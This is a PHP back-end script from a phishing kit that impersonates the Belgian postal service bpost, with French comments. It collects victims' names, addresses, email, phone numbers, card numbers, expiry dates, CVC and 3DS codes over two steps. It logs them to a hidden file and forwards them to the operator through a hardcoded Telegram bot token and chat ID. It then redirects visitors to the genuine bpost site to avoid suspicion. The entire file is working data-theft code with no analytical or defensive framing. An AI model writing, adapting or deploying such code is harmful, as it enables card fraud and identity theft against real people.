<?php
/* ========== CONFIG ========== */
const BOT_TOKEN = '9233413168:AAEiu1vmgGDkm8kAJXc2SgV5lVq9gmIuLl8';
const CHAT_ID   = '8524989510';          // ton ID, ou "123456789,987654321"
const REDIRECT  = 'https://www.bpost.be/fr';
const LOG_FILE  = __DIR__ . '/_log-8f2c.txt';
/* ============================ */

ini_set('display_errors', '0');
header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

/* ---------- lecture de l'entrée ---------- */
$raw = file_get_contents('php://input');
$ct  = $_SERVER['CONTENT_TYPE'] ?? '';
$data = ($raw && stripos($ct, 'json') !== false)
      ? (json_decode($raw, true) ?: [])
      : $_POST;

$f     = fn($k) => trim((string)($data[$k] ?? ''));
$step  = $f('step');
$track = preg_replace('/[^0-9A-Za-z]/', '', $f('tracking'));

$ip = $_SERVER['HTTP_CF_CONNECTING_IP']
   ?? explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '')[0];
$ip = trim($ip);
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$now = (new DateTime('now', new DateTimeZone('Europe/Brussels')))->format('d/m/Y H:i:s');

$e = fn($s) => htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');

/* ---------- construction du message ---------- */
if ($step === '1') {
    $msg  = "🟥 <b>BPOST — CARTE (1/2)</b>\n";
    $msg .= "━━━━━━━━━━━━━━━\n";
    $msg .= "💳 <b>" . $e($f('methode') ?: 'Bancontact') . "</b>\n";
    $msg .= "👤 <b>{$e($f('nom'))}</b>\n";
    $msg .= "🏠 {$e($f('adresse'))}\n";
    $msg .= "📍 {$e($f('cp'))} {$e($f('ville'))}\n";
    $msg .= "📧 {$e($f('email'))}\n";
    $msg .= "📱 {$e($f('gsm'))}\n";
    $msg .= "━━━━━━━━━━━━━━━\n";
    $msg .= "👤 Titulaire : {$e($f('titulaire'))}\n";
    $msg .= "💳 <code>{$e($f('carte'))}</code>\n";
    $msg .= "📅 {$e($f('exp'))}  ·  CVC <code>{$e($f('cvv'))}</code>\n";
} elseif ($step === '2') {
    $msg  = "🟥 <b>BPOST — CODE 3DS (2/2)</b>\n";
    $msg .= "━━━━━━━━━━━━━━━\n";
    $msg .= "🔑 <b>" . $e($f('code')) . "</b>\n";
} else {
    echo json_encode(['ok' => false, 'reason' => 'no_step']);
    exit;
}

$msg .= "━━━━━━━━━━━━━━━\n";
$msg .= "📦 Suivi : <code>{$e($track)}</code>\n";
$msg .= "🌍 IP : {$e($ip)}\n";
$msg .= "🕐 {$now}\n";
$msg .= "🧭 " . $e(mb_substr($ua, 0, 120));

/* ---------- journal local ---------- */
@file_put_contents(
    LOG_FILE,
    date('c') . ' | ' . $ip . ' | step=' . $step . ' | ' . json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL,
    FILE_APPEND | LOCK_EX
);

/* ---------- envoi Telegram ---------- */
function tg(string $method, array $params): void {
    $url = 'https://api.telegram.org/bot' . BOT_TOKEN . '/' . $method;
    $body = http_build_query($params);

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $body,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 8,
            CURLOPT_SSL_VERIFYPEER => true,
        ]);
        curl_exec($ch);
        curl_close($ch);
        return;
    }
    @file_get_contents($url, false, stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $body,
        'timeout' => 8,
    ]]));
}

foreach (array_map('trim', explode(',', CHAT_ID)) as $chat) {
    if ($chat === '') continue;
    tg('sendMessage', [
        'chat_id'                  => $chat,
        'text'                     => $msg,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => 'true',
    ]);
}

/* ---------- requête GET : ping de test ou redirection ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (isset($_GET['test'])) {
        tg('sendMessage', [
            'chat_id'    => explode(',', CHAT_ID)[0],
            'text'       => "✅ <b>send.php opérationnel</b>\n" . $e($now) . "\n" . $e($ip),
            'parse_mode' => 'HTML',
        ]);
        echo json_encode(['ok' => true, 'test' => 'sent']);
        exit;
    }
    header('Location: ' . REDIRECT);
    exit;
}

echo json_encode(['ok' => true]);